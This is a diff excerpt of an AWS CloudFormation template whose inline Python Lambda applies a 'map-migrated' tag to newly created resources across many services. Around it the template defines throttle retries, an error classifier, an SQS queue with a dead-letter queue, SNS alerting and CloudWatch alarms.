+              Matches the pattern used by the RGTA fallthrough below — 4 attempts,
+              1s → 2s → 4s → 8s (±25% jitter). Non-throttle ClientErrors propagate
+              to the outer _process_event classifier on the first attempt. Absorbs
+              short throttles inside the invocation so we don't burn one of the
+              5 SQS redeliveries (180s VT each) on a recoverable rate limit
+              (21.0.6, §1.81/§1.92).
+              """
+              for attempt in range(4):
+                  try:
+                      return fn()
+                  except ClientError as e:
+                      code = e.response['Error']['Code']
+                      if code in THROTTLE_CODES and attempt < 3:
+                          sleep_time = (2 ** attempt) * 1.0 * (1 + random.uniform(-0.25, 0.25))
+                          print(f"Native-tag throttled (code={code}), retry in {sleep_time:.1f}s (attempt {attempt+1}/4)")
+                          time.sleep(sleep_time)
+                          continue
+                      raise
+
+          def tag_resource(arn, tag_key, tag_value, tagging_client=None, ec2_client=None, target_region=None):
+              _tagging = tagging_client or tagging
+              _ec2 = ec2_client or ec2
+              _region = target_region or boto3.session.Session().region_name
+
+              def get_service_client(service):
+                  return boto3.client(service, region_name=_region)
+
+              # Handle special cases that don't support Resource Groups Tagging API.
+              # Each native tag call is wrapped in _retry_throttles() so short
+              # throttle bursts are absorbed in-invocation (up to 4 attempts,
+              # ~15s total worst case) rather than burning SQS redelivery
+              # budget. (§1.81/§1.92, 21.0.6)
+              if ':s3:::' in arn:
+                  s3 = get_service_client('s3')
+                  bucket = arn.split(':::')[1]
+                  existing = []
+                  try:
+                      existing = s3.get_bucket_tagging(Bucket=bucket)['TagSet']
+                  except ClientError as e:
+                      # 'NoSuchTagSet' is the expected "bucket has no tags yet" response.
+                      # Any other error (throttle, SCP deny, bucket-policy deny, transient
+                      # 5xx) means we do NOT know the existing tag state — re-raise so
+                      # SQS redrives rather than overwriting the customer's TagSet with
+                      # just map-migrated. S3 TagSet replacement is destructive (full
+                      # replace, not merge) — swallowing errors here deletes customer
+                      # tags (Owner, CostCenter, etc.). See §1.2 / U3.
+                      if e.response['Error']['Code'] != 'NoSuchTagSet':
+                          raise
+                  existing = [t for t in existing if t['Key'] != tag_key]
+                  existing.append({'Key': tag_key, 'Value': tag_value})
+                  _retry_throttles(lambda: s3.put_bucket_tagging(Bucket=bucket, Tagging={'TagSet': existing}))
+                  return True
+              elif ':bedrock:' in arn and any(r in arn for r in [':agent/',':flow/',':prompt/',':knowledge-base/']):
+                  ba = boto3.client('bedrock-agent', region_name=arn.split(':')[3])
+                  _retry_throttles(lambda: ba.tag_resource(resourceArn=arn, tags={tag_key: tag_value}))
+                  return True
+              elif ':quicksight:' in arn:
+                  # QuickSight resources must be tagged in the region where they exist
+                  qs_region = arn.split(':')[3] or region
+                  qs = boto3.client('quicksight', region_name=qs_region)
+                  account = arn.split(':')[4]
+                  _retry_throttles(lambda: qs.tag_resource(ResourceArn=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':globalaccelerator:' in arn:
+                  ga = boto3.client('globalaccelerator', region_name='us-west-2')
+                  _retry_throttles(lambda: ga.tag_resource(ResourceArn=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':cloudfront:' in arn:
+                  cf = boto3.client('cloudfront')
+                  _retry_throttles(lambda: cf.tag_resource(Resource=arn, Tags={'Items': [{'Key': tag_key, 'Value': tag_value}]}))
+                  return True
+              elif ':route53:::hostedzone/' in arn:
+                  r53 = boto3.client('route53')
+                  zone_id = arn.split('/')[-1]
+                  _retry_throttles(lambda: r53.change_tags_for_resource(ResourceType='hostedzone', ResourceId=zone_id, AddTags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':kinesis:' in arn and ':stream/' in arn:
+                  kinesis = get_service_client('kinesis')
+                  stream_name = arn.split('/')[-1]
+                  _retry_throttles(lambda: kinesis.add_tags_to_stream(StreamName=stream_name, Tags={tag_key: tag_value}))
+                  return True
+              elif ':kinesisvideo:' in arn:
+                  kv = get_service_client('kinesisvideo')
+                  _retry_throttles(lambda: kv.tag_stream(StreamARN=arn, Tags={tag_key: tag_value}))
+                  return True
+              elif ':firehose:' in arn:
+                  firehose = get_service_client('firehose')
+                  stream_name = arn.split('/')[-1]
+                  _retry_throttles(lambda: firehose.tag_delivery_stream(DeliveryStreamName=stream_name, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':apigateway:' in arn:
+                  apigw = get_service_client('apigateway') if '/restapis/' in arn else get_service_client('apigatewayv2')
+                  if '/restapis/' in arn:
+                      _retry_throttles(lambda: apigw.tag_resource(resourceArn=arn, tags={tag_key: tag_value}))
+                  else:
+                      _retry_throttles(lambda: apigw.tag_resource(ResourceArn=arn, Tags={tag_key: tag_value}))
+                  return True
+              elif ':autoscaling:' in arn:
+                  asg = get_service_client('autoscaling')
+                  name = arn.split('/')[-1]
+                  _retry_throttles(lambda: asg.create_or_update_tags(Tags=[{
+                      'ResourceId': name,
+                      'ResourceType': 'auto-scaling-group',
+                      'Key': tag_key,
+                      'Value': tag_value,
+                      'PropagateAtLaunch': False
+                  }]))
+                  return True
+              elif ':sqs:' in arn:
+                  sqs = get_service_client('sqs')
+                  queue_name = arn.split(':')[-1]
+                  q_region = arn.split(':')[3]
+                  q_account = arn.split(':')[4]
+                  queue_url = f"https://sqs.{q_region}.amazonaws.com/{q_account}/{queue_name}"
+                  _retry_throttles(lambda: sqs.tag_queue(QueueUrl=queue_url, Tags={tag_key: tag_value}))
+                  return True
+              elif ':memorydb:' in arn:
+                  memorydb = get_service_client('memorydb')
+                  _retry_throttles(lambda: memorydb.tag_resource(ResourceArn=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':dax:' in arn:
+                  # §1.84. RGTA does not support DAX — native dax.tag_resource
+                  # takes 'ResourceName=<arn>' per the boto3 service model.
+                  dax = get_service_client('dax')
+                  _retry_throttles(lambda: dax.tag_resource(ResourceName=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':storagegateway:' in arn:
+                  # §1.85. RGTA does not support Storage Gateway — native
+                  # storagegateway.add_tags_to_resource takes the ARN directly.
+                  sg = get_service_client('storagegateway')
+                  _retry_throttles(lambda: sg.add_tags_to_resource(ResourceARN=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':iot:' in arn:
+                  iot = get_service_client('iot')
+                  _retry_throttles(lambda: iot.tag_resource(resourceArn=arn, tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':cassandra:' in arn:
+                  # Keyspaces TagResource uses lowercase key/value (service inconsistency).
+                  ks = get_service_client('keyspaces')
+                  _retry_throttles(lambda: ks.tag_resource(resourceArn=arn, tags=[{'key': tag_key, 'value': tag_value}]))
+                  return True
+              elif ':cloudhsm:' in arn and ':cluster/' in arn:
+                  # cloudhsmv2 TagResource takes the raw cluster_id as ResourceId.
+                  chsm = get_service_client('cloudhsmv2')
+                  cluster_id = arn.split('cluster/')[-1]
+                  _retry_throttles(lambda: chsm.tag_resource(ResourceId=cluster_id, TagList=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':ds:' in arn and ':directory/' in arn:
+                  # ds AddTagsToResource takes the raw directory_id as ResourceId.
+                  ds = get_service_client('ds')
+                  dir_id = arn.split('directory/')[-1]
+                  _retry_throttles(lambda: ds.add_tags_to_resource(ResourceId=dir_id, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':cloudwatch:' in arn and ':dashboard/' in arn:
+                  cw = get_service_client('cloudwatch')
+                  _retry_throttles(lambda: cw.tag_resource(ResourceARN=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':dsql:' in arn:
+                  _retry_throttles(lambda: get_service_client('dsql').tag_resource(resourceArn=arn, tags={tag_key: tag_value}))
+                  return True
+              elif ':vpc-lattice:' in arn:
+                  _retry_throttles(lambda: get_service_client('vpc-lattice').tag_resource(resourceArn=arn, tags={tag_key: tag_value}))
+                  return True
+              elif ':bedrock-agentcore:' in arn:
+                  r = arn.split(':')[3] or region
+                  import urllib.parse, urllib.request, json as _json
+                  from botocore.auth import SigV4Auth as _SigV4Auth
+                  from botocore.awsrequest import AWSRequest as _AWSReq
+                  def _agentcore_tag():
+                      creds = boto3.Session().get_credentials().get_frozen_credentials()
+                      encoded = urllib.parse.quote(arn, safe='')
+                      url = f"https://bedrock-agentcore-control.{r}.amazonaws.com/tags/{encoded}"
+                      body = _json.dumps({'tags': {tag_key: tag_value}}).encode()
+                      aws_req = _AWSReq(method='POST', url=url, data=body, headers={'Content-Type': 'application/json'})
+                      _SigV4Auth(creds, 'bedrock-agentcore', r).add_auth(aws_req)
+                      http_req = urllib.request.Request(url, data=body, method='POST')
+                      for h, v in aws_req.headers.items():
+                          http_req.add_header(h, v)
+                      try:
+                          urllib.request.urlopen(http_req)
+                      except urllib.error.HTTPError as he:
+                          if he.code in (429, 503):
+                              raise ClientError({'Error': {'Code': 'ThrottlingException', 'Message': str(he)}}, 'TagResource')
+                          raise
+                  _retry_throttles(_agentcore_tag)
+                  return True
+              elif ':payment-cryptography:' in arn:
+                  r = arn.split(':')[3] or region
+                  _retry_throttles(lambda: boto3.client('payment-cryptography', region_name=r).tag_resource(ResourceArn=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              elif ':networkmanager:' in arn:
+                  _retry_throttles(lambda: boto3.client('networkmanager', region_name='us-east-1').tag_resource(ResourceArn=arn, Tags=[{'Key': tag_key, 'Value': tag_value}]))
+                  return True
+              else:
+                  # Use universal Resource Groups Tagging API (with optional cross-account client).
+                  # Retry up to 3 times with exponential backoff for throttling errors.
+                  # Uses the module-level THROTTLE_CODES defined above so the native
+                  # branches and this fallthrough share the same constant.
+                  for attempt in range(4):
+                      try:
+                          response = _tagging.tag_resources(ResourceARNList=[arn], Tags={tag_key: tag_value})
+                          if response.get('FailedResourcesMap'):
+                              failures = response['FailedResourcesMap']
+                              error_msg = failures.get(arn, {}).get('ErrorMessage', 'Unknown error')
+                              raise Exception(f"Tagging API failed: {error_msg}")
+                          return True
+                      except ClientError as e:
+                          code = e.response['Error']['Code']
+                          if code in THROTTLE_CODES and attempt < 3:
+                              sleep_time = (2 ** attempt) * 1.0 * (1 + random.uniform(-0.25, 0.25))
+                              print(f"Throttled on attempt {attempt + 1}, retrying in {sleep_time:.1f}s")
+                              time.sleep(sleep_time)
+                              continue
+                          # Fallback to EC2 tagging for VPC resources
+                          if ':ec2:' in arn:
+                              resource_id = arn.split('/')[-1]
+                              _ec2.create_tags(Resources=[resource_id], Tags=[{'Key': tag_key, 'Value': tag_value}])
+                              return True
+                          raise e
+                      except Exception as e:
+                          if ':ec2:' in arn:
+                              resource_id = arn.split('/')[-1]
+                              _ec2.create_tags(Resources=[resource_id], Tags=[{'Key': tag_key, 'Value': tag_value}])
+                              return True
+                          raise e
+
+          # Three-path error classifier (§1.115–§1.120):
+          #
+          #   TRANSIENT            → surface via batchItemFailures so SQS
+          #                          redelivers up to maxReceiveCount=5
+          #                          (~15 min budget); failing past that falls
+          #                          into EventDLQ via the redelivery-exhaustion
+          #                          path.
+          #   PERMANENT_IGNORABLE  → silent ack + CW metric. The resource
+          #                          genuinely no longer exists (deleted
+          #                          between create and tag). Retrying forever
+          #                          just wastes quota and floods alerts.
+          #                          Terraform-rollback / test-infra churn is
+          #                          the typical source.
+          #   PERMANENT_ACTIONABLE → SNS publish + CW metric + send to EventDLQ
+          #                          via batchItemFailures (redelivery-
+          #                          exhaustion path). Treated as actionable by
+          #                          humans.
+          #
+          # SCP AccessDenied at tag time is NOT classified here — Q3's
+          # deploy-time preflight (simulate-principal-policy, PR #38) owns
+          # preventing SCP-denied deploys. If a runtime SCP drift slips past
+          # preflight, it falls into PERMANENT_ACTIONABLE with everything else
+          # this classifier can't anticipate (B.7 class).
+          _TRANSIENT_MARKERS = (
+              'not in an available state',
+              'not in available state',
+              'is not currently available',
+              'InvalidClusterState',
+              'InvalidServerlessCacheStateFault',
+              'InvalidDBClusterStateFault',
+              'InvalidDBInstanceState',
+              'CREATE_IN_PROGRESS',
+              'UPDATE_IN_PROGRESS',
+              'can not be updated',
+              'rate of control plane requests',
+              'ThrottlingException',
+              'ThrottledException',
+              'Throttling',
+              'RequestLimitExceeded',
+              'TooManyRequestsException',
+              'LimitExceededException',
+              # Directory Service (MS AD + Simple AD): directory stays in
+              # "Creating" state for 5–10 min (Simple AD) or 25–45 min (MS AD).
+              # Tagging during this window returns AWS error
+              #   "The operation is not supported for directories in this
+              #    state. Directory Status: Creating"
+              # Without these markers the classifier routes to
+              # permanent_actionable → SNS alert on every AD creation, even
+              # though the condition resolves itself. Classifying as
+              # transient retries through SQS redelivery (5 × 180s = 900s),
+              # which succeeds for Simple AD within the retry budget. MS AD
+              # provisioning exceeds 900s; its retries exhaust into
+              # EventDLQ without false SNS alert noise, and the
+              # ReconciliationFunction catches the tag on the next nightly
+              # sweep. (§1.98)
+              'Directory Status: Creating',
+              'not supported for directories in this state',
+              # S3 409: concurrent CreateBucket/PutBucketTagging or in-flight
+              # lifecycle replication. Resolves on retry — AWS S3 error guide
+              # explicitly classifies OperationAborted as retryable. (Q1)
+              'OperationAborted',
+              'conflicting conditional operation',
+              # EC2 per-volume snapshot rate ceiling. Burst-create workloads
+              # (backup sweeps, DR drills) hit this; retries succeed once the
+              # token bucket refills.
+              'SnapshotCreationPerVolumeRateExceeded',
+              # AWS throttle variant: some services emit Throttling.User
+              # (EC2, STS) distinct from plain 'Throttling'. Substring match
+              # against 'Throttling' already catches it, but enumerate for
+              # clarity alongside the other throttle codes.
+              'Throttling.User',
+              # ElastiCache provisioning race (§1.101). During rapid
+              # CreateCacheCluster / CreateReplicationGroup bursts, the tag
+              # API occasionally returns "<resource> is either not present or
+              # not available" while the cluster is still settling. Retries
+              # succeed once provisioning completes.
+              'is either not present or not available',
+              # SSM ConcurrentUpdateException (§1.44). PutParameter bursts
+              # (e.g. customer automation rotating config in parallel) return
+              # "concurrently modified" when two writers touch the same
+              # parameter. Retry after SQS redelivery resolves it.
+              'concurrently modified',
+          )
+          _PERMANENT_IGNORABLE_MARKERS = (
+              # Resource genuinely deleted between create and tag event.
+              # Retrying will not find it; alerting is noise.
+              'ResourceNotFoundException',
+              'Requested resource not found',
+              'NoSuchBucket',
+              'InvalidInstanceID.NotFound',
+              'DBInstanceNotFound',
+              'DBClusterNotFoundFault',
+              'InvalidVolume.NotFound',
+              # Bedrock system-defined inference profiles fire CreateInferenceProfile but the tag API returns this error. Application profiles (same event) tag normally; we silently ack the system ones.
+              'System-defined Inference Profile is not taggable',
+              'UPDATE_ROLLBACK_FAILED',
+              'Tag related operations on the managed rule',
+          )
+
+          # Events to ignore — either not taggable, or would cause a feedback
+          # loop (e.g. PutBucketTagging: tagging an S3 bucket fires this
+          # event, which would re-trigger this Lambda, which would tag again
+          # — infinite loop).
+          _IGNORE_EVENTS = frozenset([
+              'CreateGrant', 'CreateLogStream', 'CreateTags',
+              'CreateOrUpdateTags', 'ModifyTags', 'DeleteTags',
+              'PutBucketTagging', 'TagResource', 'TagResources',
+              'UntagResource', 'UntagResources', 'AddTagsToResource',
+              # CloudFormation change sets are intermediate — the stack
+              # itself is tagged separately via CreateStack → TagResource.
+              'CreateChangeSet',
+              # Cognito user-pool clients are child resources of the
+              # already-tagged user pool; they don't need their own tags.
+              'CreateUserPoolClient',
+              # Lambda Layers are not taggable — the Lambda TagResource API
+              # regex rejects layer ARNs. Skip to avoid SNS alarm noise.
+              'PublishLayerVersion', 'PublishLayerVersion20181031',
+              # API Gateway API Keys — ARN shape rejected by all tagging
+              # APIs. Documented in docs/MAP_TAGGING_GAP_ANALYSIS.md.
+              'CreateApiKey',
+              # Service Discovery HTTP Namespace — async operationId
+              # resolution doesn't fit the SQS 180s VT. §1.87.
+              'CreateHttpNamespace',
+              # CloudWatch Logs Insights QueryDefinition — §1.86. ARN shape
+              # rejected by RGTA + native.
+              'PutQueryDefinition',
+          ])
+
+          def _classify_error(msg):
+              if any(m in msg for m in _TRANSIENT_MARKERS):
+                  return 'transient'
+              if any(m in msg for m in _PERMANENT_IGNORABLE_MARKERS):
+                  return 'permanent_ignorable'
+              return 'permanent_actionable'
+
+          def _emit_class_metric(error_class, mpe_id):
+              try:
+                  boto3.client('cloudwatch').put_metric_data(
+                      Namespace='MapAutoTagger',
+                      MetricData=[{
+                          'MetricName': 'TagFailureByClass',
+                          'Dimensions': [
+                              {'Name': 'ErrorClass', 'Value': error_class},
+                              {'Name': 'MpeId', 'Value': mpe_id},
+                          ],
+                          'Value': 1,
+                          'Unit': 'Count',
+                      }],
+                  )
+              except Exception as mx:
+                  print(f'Could not emit TagFailureByClass metric ({error_class}): {mx}')
+
+          def _publish_permanent_alert(arn, mpe_id, err_msg):
+              alert_arn = os.environ.get('ALERT_TOPIC_ARN')
+              if not alert_arn:
+                  return
+              try:
+                  boto3.client('sns').publish(
+                      TopicArn=alert_arn,
+                      Subject='MAP Auto-Tagger: Permanent tagging failure',
+                      Message=(
+                          f'Failed to apply map-migrated tag (permanent-actionable class).\\n\\n'
+                          f'Resource ARN: {arn}\\n'
+                          f'MPE ID: {mpe_id}\\n'
+                          f'Error: {err_msg}\\n\\n'
+                          f'This error is not a known transient condition and is not a '
+                          f'benign resource-deleted case. Investigate IAM policy, SCP '
+                          f'drift, or tag-quota exhaustion. Event will land in EventDLQ.\\n'
+                      )
+                  )
+              except Exception as sns_e:
+                  print(f'Could not publish SNS alert: {sns_e}')
+
+          def _unwrap_sqs_record(record):
+              """Extract the inner EventBridge event from one SQS record."""
+              return json.loads(record['body'])
+
+          def _process_event(eb_event, config):
+              """Tag all ARNs implied by a single EventBridge event.
+
+              Returns (status, error_class) where status is one of
+              {'ok', 'skipped', 'transient', 'permanent_actionable'} and
+              error_class is the classifier verdict for failures (or None).
+              Callers treat 'ok' / 'skipped' / 'permanent_ignorable' as SQS
+              acks and 'transient' / 'permanent_actionable' as retriable
+              (batchItemFailures).
+              """
+              if not is_after_agreement(config):
+                  print('Before agreement start date, skipping.')
+                  return ('skipped', None)
+
+              detail = eb_event.get('detail', {})
+              account_id = detail.get('recipientAccountId', eb_event.get('account', ''))
+              region = eb_event.get('region', detail.get('awsRegion', ''))
+
+              if not is_in_scope(config, account_id, detail):
+                  print(f'Resource not in MAP scope (account={account_id}), skipping.')
+                  return ('skipped', None)
+
+              if detail.get('errorCode') or detail.get('errorMessage'):
+                  print(f'CloudTrail event has error, skipping: {detail.get("errorMessage")}')
+                  return ('skipped', None)
+
+              event_name = detail.get('eventName', '')
+              if event_name in _IGNORE_EVENTS:
+                  print(f'Skipping non-taggable event: {event_name}')
+                  return ('skipped', None)
+
+              # Events that emit multiple resources in a single CloudTrail event
+              # (RunInstances → instances + attached EBS volumes + ENIs). AWS
+              # does not publish separate CreateVolume / CreateNetworkInterface
+              # events for children born inline with the parent.
+              try:
+                  arns = extract_arns_multi(detail, account_id, region)
+              except ClientError as e:
+                  # extract_arns_multi fails fast on InvalidInstanceID.Malformed
+                  # so the classifier can route to permanent_actionable instead
+                  # of burning the 30s describe_instances budget.
+                  err_msg = str(e)
+                  cls = _classify_error(err_msg)
+                  _emit_class_metric(cls, config['mpe_id'])
+                  if cls == 'transient':
+                      return ('transient', err_msg)
+                  if cls == 'permanent_ignorable':
+                      return ('skipped', None)
+                  _publish_permanent_alert(detail.get('eventName', '<unknown>'), config['mpe_id'], err_msg)
+                  return ('permanent_actionable', err_msg)
+              if not arns:
+                  single = extract_arn(detail, account_id, region)
+                  arns = [single] if single else []
+              if not arns:
+                  print(f'Could not extract ARN from event: {event_name}')
+                  return ('skipped', None)
+
+              tag_key = 'map-migrated'
+              tag_value = config['mpe_id']
+
+              # Per-ARN loop. A single record's ARNs share classification
+              # fate: if any ARN classifies transient, the whole record goes
+              # back to SQS (idempotent re-tag is safe); if any ARN is
+              # permanent_actionable, the record goes to DLQ; otherwise ack.
+              worst = 'ok'
+              worst_err = None
+              for arn in arns:
+                  try:
+                      tag_resource(arn, tag_key, tag_value, target_region=region)
+                      print(f'Tagged {arn} with {tag_key}={tag_value}')
+                      continue
+                  except Exception as e:
+                      err_msg = str(e)
+                      cls = _classify_error(err_msg)
+                      _emit_class_metric(cls, tag_value)
+
+                      if cls == 'transient':
+                          print(f'Transient [{arn}] {err_msg} — will retry via SQS')
+                          # Transient trumps everything — retry wins.
+                          return ('transient', err_msg)
+
+                      if cls == 'permanent_ignorable':
+                          print(f'Permanent-ignorable [{arn}] {err_msg} — resource no longer exists, skipping')
+                          # Do not downgrade worst; keep scanning other ARNs.
+                          continue
+
+                      # permanent_actionable
+                      print(f'Permanent-actionable [{arn}] {err_msg} — alerting + routing to DLQ')
+                      _publish_permanent_alert(arn, tag_value, err_msg)
+                      worst = 'permanent_actionable'
+                      worst_err = err_msg
+                      # Keep scanning remaining ARNs so siblings still tag
+                      # (matches the pre-batch behavior's best-effort intent).
+
+              return (worst, worst_err)
+
+          def handler(event, context):
+              """SQS batch handler.
+
+              EventSourceMapping is configured with BatchSize=10 and
+              FunctionResponseTypes=[ReportBatchItemFailures]. We iterate
+              each SQS record, process its inner EventBridge event, and
+              return a batchItemFailures list so only failing records get
+              redelivered. Successful / skipped / permanent-ignorable
+              records are acked by omission.
+              """
+              config = get_config()
+              records = event.get('Records', [])
+
+              # Backwards compatibility: if the Lambda is invoked directly
+              # with a raw EventBridge event (no SQS envelope), process it
+              # once. Used by ReconciliationFunction re-enqueue test paths
+              # and local smoke tests.
+              if not records:
+                  status, _ = _process_event(event, config)
+                  return {'status': status}
+
+              failures = []
+              for record in records:
+                  msg_id = record.get('messageId')
+                  try:
+                      inner = _unwrap_sqs_record(record)
+                      status, _ = _process_event(inner, config)
+                      if status in ('transient', 'permanent_actionable'):
+                          failures.append({'itemIdentifier': msg_id})
+                  except Exception as e:
+                      # Unexpected parse / unwrap error. Treat as transient
+                      # so SQS redelivers — the DLQ will capture after
+                      # maxReceiveCount if it's a poisoned message.
+                      print(f'Unexpected error processing record {msg_id}: {e}')
+                      failures.append({'itemIdentifier': msg_id})
+
+              if failures:
+                  print(f'Batch: {len(failures)}/{len(records)} records failed, reporting for redelivery')
+              return {'batchItemFailures': failures}
+
+  AutoTagEventRule:
+    Type: AWS::Events::Rule
+    Properties:
+      Name: map-auto-tagger-rule-${mpe}
+      Description: MAP 2.0 auto-tagger -- triggers on resource creation (140+ services)
+      State: ENABLED
+      EventPattern:
+        detail-type:
+          - AWS API Call via CloudTrail
+        detail:
+          eventName:
+            - prefix: "Create"
+            - prefix: "Run"
+            - prefix: "Activate"
+            - prefix: "Register"
+            - prefix: "Put"
+            - prefix: "Issue"
+            - prefix: "Start"
+            - prefix: "Request"
+            - prefix: "Allocate"
+            - prefix: "Launch"
+            - prefix: "Import"
+            - prefix: "Publish"
+            - prefix: "Enable"
+            - prefix: "Copy"
+            - prefix: "Restore"
+            - prefix: "Connect"
+      Targets:
+        - Arn: !GetAtt EventQueue.Arn
+          Id: MapAutoTaggerQueue
+
+  # Permission for EventBridge to send to SQS
+  EventQueuePolicy:
+    Type: AWS::SQS::QueuePolicy
+    Properties:
+      Queues:
+        - !Ref EventQueue
+      PolicyDocument:
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: events.amazonaws.com
+            Action: sqs:SendMessage
+            Resource: !GetAtt EventQueue.Arn
+            Condition:
+              ArnEquals:
+                aws:SourceArn: !GetAtt AutoTagEventRule.Arn
+
+  # SQS queue -- buffers CloudTrail events for up to 14 days
+  # Replaces direct EventBridge -> Lambda invocation to avoid 24h retry limit
+  EventQueue:
+    Type: AWS::SQS::Queue
+    Properties:
+      QueueName: map-auto-tagger-events-${mpe}
+      # Retry cadence covers slow-provisioning services (ElastiCache Serverless
+      # 3-8 min, Aurora 5-10 min). 5 retries x 180s = 900s total retry window.
+      VisibilityTimeout: 180
+      MessageRetentionPeriod: 1209600
+      SqsManagedSseEnabled: true
+      RedrivePolicy:
+        deadLetterTargetArn: !GetAtt EventDLQ.Arn
+        maxReceiveCount: 5
+
+  # Dead letter queue -- receives events that fail after 5 processing attempts
+  EventDLQ:
+    Type: AWS::SQS::Queue
+    Properties:
+      QueueName: map-auto-tagger-dlq-${mpe}
+      MessageRetentionPeriod: 1209600
+      SqsManagedSseEnabled: true
+
+  # Lambda event source mapping -- polls SQS and invokes Lambda.
+  # BatchSize=10 + ReportBatchItemFailures: one invocation processes up to 10
+  # messages; only per-record failures are redelivered. Raises drain rate ~10x
+  # vs prior BatchSize=1 (Phase 16 measured 1.3 msg/s per Lambda -> expected
+  # ~10+ msg/s). MaximumBatchingWindowInSeconds=5 fills small batches under
+  # steady load without adding latency on idle queues.
+  EventQueueMapping:
+    Type: AWS::Lambda::EventSourceMapping
+    Properties:
+      EventSourceArn: !GetAtt EventQueue.Arn
+      FunctionName: !Ref AutoTaggerFunction
+      BatchSize: 10
+      MaximumBatchingWindowInSeconds: 5
+      FunctionResponseTypes:
+        - ReportBatchItemFailures
+      Enabled: true
+
+  AlertTopic:
+    Type: AWS::SNS::Topic
+    Properties:
+      TopicName: auto-map-tagger-alerts-${mpe}
+      DisplayName: MAP 2.0 Auto-Tagger Alerts
+      KmsMasterKeyId: alias/aws/sns
+
+  AlertSubscription:
+    Type: AWS::SNS::Subscription
+    Condition: HasAlertEmail
+    Properties:
+      TopicArn: !Ref AlertTopic
+      Protocol: email
+      Endpoint: !Ref AlertEmail
+
+  TaggerErrorAlarm:
+    Type: AWS::CloudWatch::Alarm
+    Properties:
+      AlarmName: map-auto-tagger-errors-${mpe}
+      AlarmDescription: MAP auto-tagger Lambda is failing
+      Namespace: AWS/Lambda
+      MetricName: Errors
+      Dimensions:
+        - Name: FunctionName
+          Value: !Ref AutoTaggerFunction
+      Statistic: Sum
+      Period: 300
+      EvaluationPeriods: 1
+      Threshold: 3
+      ComparisonOperator: GreaterThanOrEqualToThreshold
+      AlarmActions:
+        - !Ref AlertTopic
+
+  DLQAlarm:
+    Type: AWS::CloudWatch::Alarm
+    Properties:
+      AlarmName: map-auto-tagger-dlq-${mpe}
+      AlarmDescription: >
+        MAP auto-tagger events failed after 5 processing attempts and were moved
+        to the dead letter queue. Check DLQ for stranded events and investigate
+        Lambda errors. Events are retained for 14 days.
+      Namespace: AWS/SQS
+      MetricName: ApproximateNumberOfMessagesVisible
+      Dimensions:
+        - Name: QueueName
+          Value: !GetAtt EventDLQ.QueueName
+      Statistic: Sum
+      Period: 300
+      EvaluationPeriods: 1
+      Threshold: 1
+      ComparisonOperator: GreaterThanOrEqualToThreshold
+      AlarmActions:
+        - !Ref AlertTopic
+      TreatMissingData: notBreaching
+
+  # CloudWatch alarm — fires when the Lambda cold-start peer-tagger detector
+  # (§1.108 Phase 16) finds another map-auto-tagger-mig* stack in this
+  # account. Concurrent taggers produce non-deterministic map-migrated tag
+  # values; alarm surface lets customers find this before a MAP audit does.
+  PeerTaggerDetectedAlarm:
+    Type: AWS::CloudWatch::Alarm
+    Properties:
+      AlarmName: map-auto-tagger-peer-detected-${mpe}
+      AlarmDescription: >
+        Another map-auto-tagger stack was detected in this account at Lambda
+        cold-start. Concurrent taggers race on CloudTrail events and the
+        map-migrated tag value is last-writer-wins. Review which MPE is
+        intended for which resources.
+      Namespace: MapAutoTagger
+      MetricName: PeerTaggerDetected
+      Dimensions:
+        - Name: MpeId
+          Value: '${mpe}'
+      Statistic: Sum
+      Period: 3600
+      EvaluationPeriods: 1
+      Threshold: 1
+      ComparisonOperator: GreaterThanOrEqualToThreshold
+      AlarmActions:
+        - !Ref AlertTopic
+      TreatMissingData: notBreaching
+
+  # CloudWatch alarm — slow trickle of permanent_actionable tagging failures
+  # (≥6 of the last 24 hourly buckets had ≥1 failure). Catches IAM drift or
+  # unhandled resource types that the per-minute errors alarm misses.
+  TrickleFailureAlarm:
+    Type: AWS::CloudWatch::Alarm
+    Properties:
+      AlarmName: map-auto-tagger-trickle-failures-${mpe}
+      AlarmDescription: >
+        Slow trickle of permanent-actionable tagging failures detected
+        (≥6 of the last 24 hourly buckets had ≥1 failure). Investigate
+        IAM drift, tag-quota exhaustion, or a new resource type the
+        classifier isn't handling yet.
+      Namespace: MapAutoTagger
+      MetricName: TagFailureByClass
+      Dimensions:
+        - Name: ErrorClass
+          Value: permanent_actionable
+        - Name: MpeId
+          Value: '${mpe}'
+      Statistic: Sum
+      Period: 3600
+      EvaluationPeriods: 24
+      DatapointsToAlarm: 6
+      Threshold: 1
+      ComparisonOperator: GreaterThanOrEqualToThreshold
+      AlarmActions:
+        - !Ref AlertTopic
+      TreatMissingData: notBreaching
+
+  # Reconciliation Lambda — daily safety-net that enumerates in-scope
+  # resources via RGTA GetResources and re-enqueues any whose map-migrated tag
+  # is missing or wrong-MPE through EventQueue. Live Lambda's classifier handles
+  # the actual tag writes. See docs/design-reconciliation.md for architecture.
+
+  ReconciliationLogGroup:
+    Type: AWS::Logs::LogGroup
+    DeletionPolicy: Delete
+    UpdateReplacePolicy: Delete
+    Properties:
+      LogGroupName: /aws/lambda/map-auto-tagger-reconciliation-${mpe}
+      RetentionInDays: 14
+
+  ReconciliationRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub 'map-auto-tagger-recon-role-${mpe}-\${AWS::Region}'
+      AssumeRolePolicyDocument:
+        Version: '2012-10-17'
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: map-auto-tagger-reconciliation-policy
+          PolicyDocument:
+            Version: '2012-10-17'
+            Statement:
+              - Sid: ReadScopeConfig
+                Effect: Allow
+                Action: ssm:GetParameter
